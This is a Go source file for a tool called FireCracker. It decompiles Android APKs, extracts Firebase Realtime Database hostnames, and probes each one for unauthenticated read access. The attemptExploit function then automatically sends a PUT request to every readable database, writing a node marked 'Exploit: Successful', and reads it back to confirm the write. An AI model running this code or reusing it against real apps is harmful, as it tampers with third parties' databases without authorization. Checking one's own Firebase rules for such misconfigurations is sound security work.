package main

import (
	"bytes"
	"crypto/md5"
	"encoding/json"
	"flag"
	"fmt"
	"io/fs"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"sort"

	"io"

	"github.com/fatih/color"
)

var (
	apkFilePath string
	apkFolder   string
)

// Print colored text to the console
func myPrint(text, typee string) {
	switch typee {
	case "INFO":
		color.Yellow(text)
	case "ERROR":
		color.Red(text)
	case "MESSAGE":
		color.Magenta(text)
	case "INSECURE_WS":
		color.New(color.FgRed, color.Bold).Println(text)
	case "OUTPUT":
		color.Blue(text)
	case "OUTPUT_WS":
		color.New(color.FgBlue, color.Bold).Print(text)
	case "SECURE":
		color.Green(text)
	default:
		fmt.Println(text)
	}
}

// Check error and handle if fatal
func checkErr(err error, msg string, fatal bool) {
	if err != nil {
		myPrint(msg+": "+err.Error(), "ERROR")
		if fatal {
			os.Exit(1)
		}
	}
}

func displayBanner() {
	banner := `


	8888888888 8888888 8888888b.  8888888888 .d8888b.  8888888b.         d8888  .d8888b.  888    d8P  8888888888 8888888b.  
	888          888   888   Y88b 888       d88P  Y88b 888   Y88b       d88888 d88P  Y88b 888   d8P   888        888   Y88b 
	888          888   888    888 888       888    888 888    888      d88P888 888    888 888  d8P    888        888    888 
	8888888      888   888   d88P 8888888   888        888   d88P     d88P 888 888        888d88K     8888888    888   d88P 
	888          888   8888888P"  888       888        8888888P"     d88P  888 888        8888888b    888        8888888P"  
	888          888   888 T88b   888       888    888 888 T88b     d88P   888 888    888 888  Y88b   888        888 T88b   
	888          888   888  T88b  888       Y88b  d88P 888  T88b   d8888888888 Y88b  d88P 888   Y88b  888        888  T88b  
	888        8888888 888   T88b 8888888888 "Y8888P"  888   T88b d88P     888  "Y8888P"  888    Y88b 8888888888 888   T88b 
																																																										
 	FireCracker - Scan your Firebase instances for misconfigurations
 	Version: 1.0.0

	`
	color.Magenta(banner)
}

// Display help menu explaining how to use the tool
func displayHelp() {
	fmt.Println("Usage: FireCracker [options]")
	fmt.Println("Options:")
	fmt.Println("  -input <file>     Path of the input file")
	fmt.Println("  -folder <folder>  Path to the folder containing .apk files")
	fmt.Println("  -h, -help         Show this help message")
}

// Parse command-line arguments
func init() {
	flag.StringVar(&apkFilePath, "input", "", "Path of the input file")
	flag.StringVar(&apkFilePath, "i", "", "Path of the input file (shorthand)")
	flag.StringVar(&apkFolder, "folder", "", "Path to the folder containing .apk files")
	flag.StringVar(&apkFolder, "f", "", "Path to the folder containing .apk files (shorthand)")
}

// Handle the APK file input
func handleApkFile(apkFilePath string) {
	apkFileName, valid := isValidPath(apkFilePath)
	if !valid {
		os.Exit(1)
	}
	projectDir := reverseEngineerApplication(apkFilePath, apkFileName)
	firebaseProjectList := findFirebaseProjectNames(projectDir)
	printFirebaseProjectNames(firebaseProjectList)
	scanFirebaseProject(firebaseProjectList)
}

// Function to handle a folder of .apk files
func handleApkFolder(folderPath string) {
	files, err := func() ([]fs.FileInfo, error) {
		f, err := os.Open(folderPath)
		if err != nil {
			return nil, err
		}
		list, err := f.Readdir(-1)
		f.Close()
		if err != nil {
			return nil, err
		}
		sort.Slice(list, func(i, j int) bool {
			return list[i].Name() < list[j].Name()
		})
		return list, nil
	}()
	if err != nil {
		myPrint(fmt.Sprintf("[X] Failed to read the folder: %v", err), "ERROR")
		os.Exit(1)
	}

	for _, file := range files {
		if filepath.Ext(file.Name()) == ".apk" {
			apkFilePath := filepath.Join(folderPath, file.Name())
			myPrint(fmt.Sprintf("[*] Processing file: %s", apkFilePath), "INFO")
			handleApkFile(apkFilePath)
		}
	}
}

// Check if the APK file path is valid
func isValidPath(apkFilePath string) (string, bool) {
	myPrint("[*] Checking if the APK file path is valid.", "INFO")
	if _, err := os.Stat(apkFilePath); os.IsNotExist(err) {
		myPrint("[X] Incorrect APK file path found. Please try again with correct file name.", "ERROR")
		return "", false
	}
	myPrint("[!] APK File Found!", "INFO")
	return filepath.Base(apkFilePath), true
}

// Reverse engineer the APK file
func reverseEngineerApplication(apkFilePath, apkFileName string) string {
	myPrint("[*] Initiating APK Decompilation Process...", "INFO")

	// Get the current working directory
	currentDir, err := os.Getwd()
	checkErr(err, "[X] Error getting current working directory", true)

	// Create a project directory based on the current working directory
	projectDir := filepath.Join(currentDir, "Decompiled_APK", apkFileName+"_"+fmt.Sprintf("%x", md5.Sum([]byte(apkFileName))))

	// Check if the project directory already exists
	if _, err := os.Stat(projectDir); !os.IsNotExist(err) {
		myPrint("[X] This APK is already decompiled. Skipping decompilation and proceeding with scanning application.", "INFO")
		return projectDir
	}

	// Execute Apktool command
	cmd := exec.Command("apktool", "d", "-o", filepath.Join(projectDir, "apktool"), apkFilePath)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err = cmd.Run()
	if err != nil {
		myPrint(fmt.Sprintf("[X] Apktool failed with error: %v\nOutput:\n%s\n", err, out.String()), "ERROR")
		checkErr(err, "[X] Apktool failed with exit status. Please Try Again.", true)
	}

	myPrint("[!] Successfully decompiled the application. Proceeding with enumerating firebase project names from the application code...", "INFO")
	return projectDir
}

// Find Firebase project names in the decompiled APK
func findFirebaseProjectNames(projectDir string) []string {
	var firebaseProjectList []string
	regex := regexp.MustCompile(`https*://(.+?)\.firebaseio.com`)
	err := filepath.Walk(projectDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			content, err := os.ReadFile(path)
			if err != nil {
				return err
			}
			matches := regex.FindAllStringSubmatch(string(content), -1)
			for _, match := range matches {
				if len(match) > 1 {
					firebaseProjectList = append(firebaseProjectList, match[1])
					myPrint("[!] Firebase Instance(s) Found!", "INFO")
				}
			}
		}
		return nil
	})
	checkErr(err, "[X] Error walking through the project directory", false)
	if len(firebaseProjectList) == 0 {
		myPrint("[X] No Firebase Project Found :(", "OUTPUT")
		os.Exit(0)
	}
	return firebaseProjectList
}

// Print found Firebase project names
func printFirebaseProjectNames(firebaseProjectList []string) {
	myPrint(fmt.Sprintf("[!] Found %d Project References in the application. Printing the list of Firebase Projects found.", len(firebaseProjectList)), "OUTPUT")
	for _, projectName := range firebaseProjectList {
		myPrint("[*] Firebase: "+projectName+"\n", "OUTPUT_WS")
	}
}

func scanFirebaseProject(firebaseProjectList []string) {
	for _, projectName := range firebaseProjectList {
		url := "https://" + projectName + ".firebaseio.com/.json"
		myPrint("[!] Firebase URL found: "+url+"\n", "OUTPUT_WS")

		// Check for unauthenticated access by attempting to read the database
		resp, err := http.Get(url)
		if err != nil {
			myPrint("[X] Error sending request: "+err.Error(), "ERROR")
			continue
		}
		defer resp.Body.Close()

		// Interpret the response
		if resp.StatusCode == 200 {
			myPrint("[!] Vulnerable Firebase Instance Found: "+projectName, "INSECURE_WS")

			// Attempt to exploit the misconfiguration
			// Replace with dynamic values as needed.
			attemptExploit(projectName, "testFile", "Test Name", "test@example.com", "www.example.com", "This is a test message")
		} else if resp.StatusCode == 401 || resp.StatusCode == 403 {
			myPrint("[!] Secure Firebase Instance Found: "+projectName, "SECURE")
		} else {
			myPrint("[?] Firebase Instance Status Unknown: "+projectName, "ERROR")
		}
	}
}

func attemptExploit(site, file, name, email, website, message string) {
	siteURL := "https://" + site + ".firebaseio.com/" + file + ".json"

	// Prepare the data payload
	data := map[string]string{
		"Exploit": "Successful",
		"website": website,
		"email":   email,
		"name":    name,
		"message": message,
	}

	payloadBytes, err := json.Marshal(data)
	if err != nil {
		myPrint("[X] Error encoding JSON: "+err.Error(), "ERROR")
		return
	}

	// Create and send the PUT request
	req, err := http.NewRequest("PUT", siteURL, bytes.NewBuffer(payloadBytes))
	if err != nil {
		myPrint("[X] Error creating request: "+err.Error(), "ERROR")
		return
	}

	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		myPrint("[X] Error sending request: "+err.Error(), "ERROR")
		return
	}
	defer response.Body.Close()

	// Print the response status
	myPrint("--------------------------------------------------", "INFO")
	if response.StatusCode == 200 {
		myPrint("[!] Exploited", "SECURE")
		myPrint("[*] File Created: "+siteURL, "INFO")
	} else {
		myPrint("[X] Not Exploited", "ERROR")
		myPrint("[X] No File Created", "INFO")
	}
	myPrint("--------------------------------------------------", "INFO")

	// Fetch and print the new content for verification
	resp, err := http.Get(siteURL)
	if err != nil {
		myPrint("[X] Error fetching data: "+err.Error(), "ERROR")
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.Reader(resp.Body))
	if err != nil {
		myPrint("[X] Error reading response: "+err.Error(), "ERROR")
		return
	}

	myPrint(string(body), "OUTPUT")
	myPrint("--------------------------------------------------", "INFO")

	// Provide reasoning based on the status code
	switch response.StatusCode {
	case 200:
		myPrint("[>>] Successfully Exploited", "OUTPUT_WS")
	case 401:
		myPrint("[X] Not Exploitable\n[!] Reason: All Permissions Denied", "ERROR")
	case 404:
		myPrint("[X] Database Not Found\n[!] Reason: Firebase Database Not Found", "ERROR")
	default:
		myPrint(fmt.Sprintf("[?] Unknown Error\n[!] Reason: HTTP status %d", response.StatusCode), "ERROR")
	}
}

func main() {
	displayBanner()
	flag.Usage = displayHelp
	flag.Parse()

	if apkFilePath != "" {
		myPrint("[*] Processing single APK file: "+apkFilePath, "INFO")
		handleApkFile(apkFilePath)
	} else if apkFolder != "" {
		myPrint("[*] Processing APK files in folder: "+apkFolder, "INFO")
		handleApkFolder(apkFolder)
	} else {
		fmt.Fprintln(os.Stdout, []any{"[X] No APK file or folder specified.\n"}...)
		flag.Usage()
		os.Exit(1)
	}

	myPrint("[*] Thank you for using FireCracker :)", "INFO")

}
